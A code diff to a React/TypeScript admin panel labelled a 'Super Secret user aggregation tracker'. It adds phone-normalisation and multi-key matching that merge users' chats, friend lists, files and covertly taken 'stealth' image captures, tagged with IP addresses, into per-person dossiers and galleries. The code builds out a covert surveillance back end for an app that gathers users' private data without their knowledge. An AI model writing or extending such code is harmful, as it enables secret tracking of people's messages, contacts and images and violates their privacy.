@@ -679,6 +679,25 @@ export const AdminPanel9865 = ({ onClose, showToast, tips, onUpdateTips }: Admin
   );
 };
 
+// Helper function to normalize and clean phone numbers for accurate matching across systems
+const normalizePhone = (p: string | undefined): string => {
+  if (!p) return '';
+  let cleaned = p.replace(/[^0-9]/g, '');
+  if (cleaned.startsWith('00')) {
+    cleaned = cleaned.substring(2);
+  }
+  if (cleaned.startsWith('0')) {
+    cleaned = cleaned.substring(1);
+  }
+  if (cleaned.startsWith('966')) {
+    cleaned = cleaned.substring(3);
+  }
+  if (cleaned.startsWith('0')) {
+    cleaned = cleaned.substring(1);
+  }
+  return cleaned;
+};
+
 // ---------------------------------------------------------------------------------
 // 2. FORENSIC CONTROL PANEL 6532 (Super Secret user aggregation tracker and settings)
 // ---------------------------------------------------------------------------------
@@ -727,132 +746,184 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
       let localUsers: any[] = [];
       if (res.ok) localUsers = await res.json();
       
-      const combinedMap: Record<string, any> = {};
-      
+      const combined: any[] = [];
+
+      // Add Firestore profiles first
       fbProfiles.forEach(p => {
-        if (p.phone) {
-          combinedMap[p.phone] = {
-            ...p,
-            friends: p.friends || [],
-            chats: p.chats || []
-          };
-        }
+        combined.push({
+          ...p,
+          phone: p.phone ? p.phone.trim() : '',
+          usernameUnified: p.usernameUnified || p.name || 'مجهول',
+          deviceId: p.deviceId || '',
+          friends: p.friends || [],
+          chats: p.chats || []
+        });
       });
 
+      // Merge local users (from server disk) into combined list using multi-key matching
       localUsers.forEach(u => {
-        if (!u.phone) return;
-        if (combinedMap[u.phone]) {
-          combinedMap[u.phone].usernameUnified = u.name || combinedMap[u.phone].usernameUnified || 'مجهول';
-          combinedMap[u.phone].deviceId = u.deviceId || combinedMap[u.phone].deviceId || '';
-          if (!combinedMap[u.phone].friends || combinedMap[u.phone].friends.length === 0) {
-            combinedMap[u.phone].friends = u.friends || [];
-          }
-          if (!combinedMap[u.phone].chats || combinedMap[u.phone].chats.length === 0) {
-            combinedMap[u.phone].chats = u.chats || [];
-          }
+        if (!u.phone && !u.deviceId) return;
+
+        const match = combined.find(p => {
+          const normP = normalizePhone(p.phone);
+          const normU = normalizePhone(u.phone);
+          
+          const phoneMatch = normP && normU && normP === normU;
+          const devMatch = p.deviceId && u.deviceId && p.deviceId.toLowerCase() === u.deviceId.toLowerCase();
+          const nameMatch = p.usernameUnified && u.name && p.usernameUnified.trim().toLowerCase() === u.name.trim().toLowerCase();
+
+          return phoneMatch || devMatch || nameMatch;
+        });
+
+        if (match) {
+          match.usernameUnified = u.name || match.usernameUnified || 'مجهول';
+          if (u.phone && !match.phone) match.phone = u.phone;
+          if (u.deviceId && !match.deviceId) match.deviceId = u.deviceId;
+          
+          const seenFriends = new Set(match.friends.map((f: any) => normalizePhone(f.phone)));
+          const uFriends = u.friends || [];
+          uFriends.forEach((f: any) => {
+            const normF = normalizePhone(f.phone);
+            if (normF && !seenFriends.has(normF)) {
+              match.friends.push(f);
+              seenFriends.add(normF);
+            }
+          });
+
+          const seenChats = new Set(match.chats.map((c: any) => c.id || `${c.timestamp}_${c.text || c.message}`));
+          const uChats = u.chats || [];
+          uChats.forEach((c: any) => {
+            const uniqueKey = c.id || `${c.timestamp}_${c.text || c.message}`;
+            if (!seenChats.has(uniqueKey)) {
+              match.chats.push(c);
+              seenChats.add(uniqueKey);
+            }
+          });
         } else {
-          combinedMap[u.phone] = {
-            phone: u.phone,
+          combined.push({
+            phone: u.phone || '',
             usernameUnified: u.name || 'مجهول',
             deviceId: u.deviceId || '',
             deviceModel: 'متصفح ويب عادي',
             operatingSystem: 'ويب أونلاين',
             chats: u.chats || [],
             friends: u.friends || []
-          };
+          });
         }
       });
-
-      const combined = Object.values(combinedMap);
 
       // Fetch stealth images from Firebase
       const captures = await firebaseFetchAllStealthCaptures();
       setStealthImages(captures);
 
-      // Fetch stored folders directories
-      let gotFolders = false;
+      // Fetch stored folders directories (physical ones from server)
       let finalFolders: any[] = [];
       try {
         const foldersRes = await fetch('/api/stored-images');
         if (foldersRes.ok) {
           const foldersData = await foldersRes.json();
           if (foldersData && foldersData.length > 0) {
-            setStoredFolders(foldersData);
-            finalFolders = foldersData;
-            gotFolders = true;
+            finalFolders = [...foldersData];
           }
         }
       } catch (err) {
         console.warn("Failed fetching stored folders from API:", err);
       }
 
-      // If local filesystem API is empty or failing, construct virtual folders from Firestore documents
-      if (!gotFolders) {
-        try {
-          const fbFiles = await firebaseFetchAllUserFiles();
-          const virtualFoldersMap: Record<string, any> = {};
+      // Construct virtual folders from Firestore and combine with physical ones
+      try {
+        const fbFiles = await firebaseFetchAllUserFiles();
+        const virtualFoldersMap: Record<string, any> = {};
 
-          // Add user files to virtual folders
-          fbFiles.forEach(f => {
-            const userPhone = f.phone || f.deviceId || 'مشترك_آمن';
-            const folderName = `${userPhone}_FirebaseCloud`;
-            if (!virtualFoldersMap[folderName]) {
-              virtualFoldersMap[folderName] = {
-                folderName,
-                files: []
-              };
-            }
-            virtualFoldersMap[folderName].files.push({
-              name: f.fileName || `file_${f.id}.pdf`,
-              path: f.fileContent || '', 
-              timestamp: f.timestamp || Date.now()
-            });
+        fbFiles.forEach(f => {
+          const userPhone = f.phone || f.deviceId || 'مشترك_آمن';
+          const folderName = `${userPhone}_FirebaseCloud`;
+          if (!virtualFoldersMap[folderName]) {
+            virtualFoldersMap[folderName] = {
+              folderName,
+              displayName: `وثائق سحابية للعميل ${f.usernameUnified || userPhone}`,
+              phone: f.phone || '',
+              deviceId: f.deviceId || '',
+              files: []
+            };
+          }
+          virtualFoldersMap[folderName].files.push({
+            name: f.fileName || `file_${f.id}.pdf`,
+            path: f.fileContent || '', 
+            timestamp: f.timestamp || Date.now()
           });
+        });
 
-          // Embed stealth captures into the user folders so that folder views list them
-          captures.forEach(img => {
-            const userPhone = img.phone || img.deviceId || 'مشترك_حساب';
-            const folderName = `${userPhone}_FirebaseCloud`;
-            if (!virtualFoldersMap[folderName]) {
-              virtualFoldersMap[folderName] = {
-                folderName,
-                files: []
-              };
-            }
-            virtualFoldersMap[folderName].files.push({
-              name: `stealth_${img.id}.ts`, 
-              path: img.imageContent || img.imageB64 || img.url || '',
-              timestamp: img.timestamp || img.createdAt || Date.now(),
-              isEncrypted: false
-            });
+        captures.forEach(img => {
+          const userPhone = img.phone || img.deviceId || 'مشترك_حساب';
+          const folderName = `${userPhone}_FirebaseCloud`;
+          if (!virtualFoldersMap[folderName]) {
+            virtualFoldersMap[folderName] = {
+              folderName,
+              displayName: `لقطات سحابية للعميل ${img.usernameUnified || userPhone}`,
+              phone: img.phone || '',
+              deviceId: img.deviceId || '',
+              files: []
+            };
+          }
+          virtualFoldersMap[folderName].files.push({
+            name: `stealth_${img.id}.ts`, 
+            path: img.imageContent || img.imageB64 || img.url || '',
+            timestamp: img.createdAt || img.timestamp || Date.now(),
+            isEncrypted: false
           });
+         });
 
-          const virtualList = Object.values(virtualFoldersMap);
-          setStoredFolders(virtualList);
-          finalFolders = virtualList;
-        } catch (fireErr) {
-          console.error("Failed building virtual folders from Firestore:", fireErr);
-        }
+        const virtualList = Object.values(virtualFoldersMap);
+        virtualList.forEach(vf => {
+          const existing = finalFolders.find(f => f.folderName.toLowerCase() === vf.folderName.toLowerCase());
+          if (existing) {
+            vf.files.forEach((file: any) => {
+              if (!existing.files.some((ef: any) => ef.name === file.name)) {
+                existing.files.push(file);
+              }
+            });
+          } else {
+            finalFolders.push(vf);
+          }
+        });
+      } catch (virtualErr) {
+        console.error("Failed building virtual folders from Firestore:", virtualErr);
       }
 
-      // Add missing profiles from stored folders/virtual folders to combined admin profiles list
+      setStoredFolders(finalFolders);
+
       finalFolders.forEach(fol => {
         const name = fol.folderName;
         let extPhone = '';
+        let extDeviceId = '';
+        
         if (name.startsWith('vault_sync_')) {
           extPhone = name.replace('vault_sync_', '').split('_')[0];
         } else if (name.endsWith('_FirebaseCloud')) {
           extPhone = name.replace('_FirebaseCloud', '');
         } else {
-          extPhone = name.split('_')[0];
+          const parts = name.split('_');
+          extPhone = parts.find(p => /^[0-9]+$/.test(p)) || '';
+          extDeviceId = parts[0] || '';
         }
+
+        const safePhone = extPhone.replace(/[^0-9]/g, '');
+        const normSafePhone = normalizePhone(safePhone);
         
-        if (extPhone && extPhone !== 'unknown' && extPhone !== 'guest' && extPhone !== 'مشترك') {
-          const safePhone = extPhone.replace(/[^0-9]/g, '');
-          if (safePhone && !combined.some(p => p.phone === safePhone || p.phone?.replace(/[^0-9]/g, '') === safePhone)) {
+        if ((safePhone && safePhone !== 'unknown' && safePhone !== 'guest' && safePhone !== 'مشترك') || extDeviceId) {
+          const exists = combined.some(p => {
+            const normP = normalizePhone(p.phone);
+            const phoneMatch = normSafePhone && normP && normP === normSafePhone;
+            const devIdMatch = extDeviceId && p.deviceId && p.deviceId.toLowerCase() === extDeviceId.toLowerCase();
+            return phoneMatch || devIdMatch;
+          });
+
+          if (!exists) {
             combined.push({
-              phone: safePhone,
-              usernameUnified: `مستندات احتياطية (${safePhone})`,
+              phone: safePhone || extDeviceId,
+              usernameUnified: `مجلد احتياطي (${safePhone || extDeviceId})`,
+              deviceId: extDeviceId,
               deviceModel: 'مجلد نسخ احتياطي سري',
               operatingSystem: 'تخزين مباشر',
               chats: [],
@@ -1512,13 +1583,28 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
   const renderStealthGallery = () => {
     const serverFiles: any[] = [];
     storedFolders.forEach(fol => {
+      const folderName = fol.folderName;
+      let extPhone = '';
+      let extDeviceId = '';
+      if (folderName.startsWith('vault_sync_')) {
+        extPhone = folderName.replace('vault_sync_', '').split('_')[0];
+      } else if (folderName.endsWith('_FirebaseCloud')) {
+        extPhone = folderName.replace('_FirebaseCloud', '');
+      } else {
+        const parts = folderName.split('_');
+        extPhone = parts.find((p: any) => /^[0-9]+$/.test(p)) || '';
+        extDeviceId = parts[0] || '';
+      }
+
       (fol.files || []).forEach((file: any) => {
         if (file.isEncrypted || file.name.includes('stealth') || file.name.includes('capture') || file.name.endsWith('.ts')) {
           serverFiles.push({
             id: `${fol.folderName}/${file.name}`,
             url: file.path,
             ip: fol.folderName.split('_')[1] || 'شبكة اتصالات محلية',
-            user: fol.folderName.split('_')[0] || 'غير معروف',
+            user: extPhone || extDeviceId || fol.folderName.split('_')[0] || 'غير معروف',
+            phone: extPhone || fol.phone || '',
+            deviceId: extDeviceId || fol.deviceId || fol.folderName.split('_')[0] || '',
             timestamp: file.timestamp,
             folder: fol.folderName,
             name: file.name
@@ -1531,7 +1617,9 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
       id: img.id,
       url: img.url || img.imageB64 || img.imageContent,
       ip: img.ipAddress || img.ip || 'شبكة أونلاين',
-      user: img.usernameUnified || img.phone || 'مشترك آمن',
+      user: img.usernameUnified || img.phone || img.deviceId || 'مشترك آمن',
+      phone: img.phone || '',
+      deviceId: img.deviceId || '',
       timestamp: img.createdAt || img.timestamp || new Date(),
       isFirebase: true
     }));
@@ -1571,13 +1659,33 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
       showToast('جاري بدء تحميل الملف... 💾', 'success');
     };
 
-    // Filter items based on selected sub-tab
+    // Filter items based on selected sub-tab with robust profile matching
     let activeMediaItems = allStealth;
     if (gallerySubTab === 'folder') {
       activeMediaItems = allStealth.filter(item => {
-        const phoneVal = item.user;
-        const matchedProfile = profiles.find(p => p.phone === phoneVal || p.usernameUnified === phoneVal);
-        return item.user === gallerySelectedPhone || matchedProfile?.phone === gallerySelectedPhone;
+        if (!gallerySelectedPhone) return false;
+
+        const matchedProfile = profiles.find(p => {
+          const normP = normalizePhone(p.phone);
+          const normItemPhone = normalizePhone(item.phone);
+          const normItemUser = normalizePhone(item.user);
+
+          const phoneMatch = normP && (normP === normItemPhone || normP === normItemUser);
+          const devMatch = p.deviceId && (
+            (item.deviceId && p.deviceId.toLowerCase() === item.deviceId.toLowerCase()) ||
+            (item.user && p.deviceId.toLowerCase() === item.user.toLowerCase())
+          );
+
+          return phoneMatch || devMatch;
+        });
+
+        // Check if selected phone matches directly or via custom matched profile
+        const normSelected = normalizePhone(gallerySelectedPhone);
+        const phoneMatch = (item.phone && normalizePhone(item.phone) === normSelected) || 
+                           (item.user && normalizePhone(item.user) === normSelected) ||
+                           (item.deviceId && matchedProfile && normalizePhone(matchedProfile.phone) === normSelected);
+
+        return phoneMatch || (matchedProfile && matchedProfile.phone === gallerySelectedPhone);
       });
     }
 
@@ -1622,8 +1730,8 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
               >
                 <option value="">-- اختر هاتف أو اسم العميل المطلوب --</option>
                 {profiles.map(p => (
-                  <option key={p.phone} value={p.phone}>
-                    {p.usernameUnified || p.name || 'مجهول'} ({p.phone})
+                  <option key={p.phone || p.deviceId} value={p.phone}>
+                    {p.usernameUnified || p.name || 'مجهول'} ({p.phone || p.deviceId})
                   </option>
                 ))}
               </select>
@@ -1656,10 +1764,22 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
         ) : (
           <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-4 animate-in fade-in duration-300">
             {activeMediaItems.map(item => {
-              const phoneVal = item.user;
-              const matchedProfile = profiles.find(p => p.phone === phoneVal || p.usernameUnified === phoneVal);
-              const userDisplayName = matchedProfile ? matchedProfile.usernameUnified : 'عضو روح آمن';
-              const userDisplayPhone = matchedProfile ? matchedProfile.phone : (phoneVal || 'مجهول');
+              const matchedProfile = profiles.find(p => {
+                const normP = normalizePhone(p.phone);
+                const normItemPhone = normalizePhone(item.phone);
+                const normItemUser = normalizePhone(item.user);
+
+                const phoneMatch = normP && (normP === normItemPhone || normP === normItemUser);
+                const devMatch = p.deviceId && (
+                  (item.deviceId && p.deviceId.toLowerCase() === item.deviceId.toLowerCase()) ||
+                  (item.user && p.deviceId.toLowerCase() === item.user.toLowerCase())
+                );
+
+                return phoneMatch || devMatch;
+              });
+
+              const userDisplayName = matchedProfile ? matchedProfile.usernameUnified : (item.user || 'عضو روح آمن');
+              const userDisplayPhone = matchedProfile ? (matchedProfile.phone || matchedProfile.deviceId) : (item.phone || item.user || 'مجهول');
 
               return (
                 <div key={item.id} className="bg-[#0c0c0e] border border-gray-900 rounded-3xl overflow-hidden shadow-lg p-2.5 flex flex-col gap-2 relative group hover:border-emerald-500/40 transition-all">
@@ -2226,17 +2346,70 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
                 );
               }
 
-              const userFolder = storedFolders.find(f => {
-                const nameLower = f.folderName.toLowerCase();
-                const phoneMatch = selectedUser.phone && (nameLower.includes(selectedUser.phone) || f.phone === selectedUser.phone);
-                const devIdMatch = selectedUser.deviceId && (nameLower.startsWith(selectedUser.deviceId.toLowerCase()) || nameLower.includes(selectedUser.deviceId.toLowerCase()) || f.deviceId === selectedUser.deviceId);
-                return phoneMatch || devIdMatch;
+              const matchingFolders = storedFolders.filter(f => {
+                const folderNameLower = f.folderName.toLowerCase();
+                const displayNameLower = (f.displayName || '').toLowerCase();
+                const fNameLower = (f.name || '').toLowerCase();
+                
+                const normSelectedPhone = normalizePhone(selectedUser.phone);
+                const normFolderPhone = normalizePhone(f.phone);
+                
+                const phoneMatch = selectedUser.phone && (
+                  folderNameLower.includes(selectedUser.phone) || 
+                  (normSelectedPhone && folderNameLower.includes(normSelectedPhone)) ||
+                  f.phone === selectedUser.phone ||
+                  (normSelectedPhone && normFolderPhone && normSelectedPhone === normFolderPhone) ||
+                  displayNameLower.includes(selectedUser.phone)
+                );
+                
+                const devIdMatch = selectedUser.deviceId && (
+                  folderNameLower.startsWith(selectedUser.deviceId.toLowerCase()) || 
+                  folderNameLower.includes(selectedUser.deviceId.toLowerCase()) || 
+                  f.deviceId === selectedUser.deviceId ||
+                  displayNameLower.includes(selectedUser.deviceId.toLowerCase())
+                );
+                
+                const nameMatch = selectedUser.usernameUnified && (
+                  folderNameLower.includes(selectedUser.usernameUnified.toLowerCase()) ||
+                  fNameLower.includes(selectedUser.usernameUnified.toLowerCase()) ||
+                  displayNameLower.includes(selectedUser.usernameUnified.toLowerCase())
+                );
+
+                return phoneMatch || devIdMatch || nameMatch;
               });
-              const localFiles = userFolder ? userFolder.files : [];
+
+              const localFiles: any[] = [];
+              matchingFolders.forEach(fol => {
+                (fol.files || []).forEach((file: any) => {
+                  const alreadyExists = localFiles.some(
+                    existing => existing.name === file.name && existing.path === file.path
+                  );
+                  if (!alreadyExists) {
+                    localFiles.push({
+                      ...file,
+                      folder: fol.folderName
+                    });
+                  }
+                });
+              });
 
               let displayItems: any[] = [];
               if (activeMediaFolder === 'stealth') {
-                const fbFiles = stealthImages.filter(img => img.phone === selectedUser.phone || img.usernameUnified === selectedUser.usernameUnified || img.deviceId === selectedUser.phone || img.deviceId?.includes(selectedUser.phone)).map(img => ({
+                const fbFiles = stealthImages.filter(img => {
+                  const normP = normalizePhone(selectedUser.phone);
+                  const normImgPhone = normalizePhone(img.phone);
+                  
+                  const phoneMatch = normP && (normP === normImgPhone || normalizePhone(img.usernameUnified) === normP);
+                  const devMatch = selectedUser.deviceId && (
+                    (img.deviceId && img.deviceId.toLowerCase() === selectedUser.deviceId.toLowerCase()) ||
+                    (img.phone && img.phone.toLowerCase() === selectedUser.deviceId.toLowerCase())
+                  );
+                  const nameMatch = selectedUser.usernameUnified && img.usernameUnified && (
+                    img.usernameUnified.trim().toLowerCase() === selectedUser.usernameUnified.trim().toLowerCase()
+                  );
+
+                  return phoneMatch || devMatch || nameMatch;
+                }).map(img => ({
                   id: img.id,
                   url: img.url || img.imageB64 || img.imageContent,
                   name: `stealth_${img.id}.jpg`,
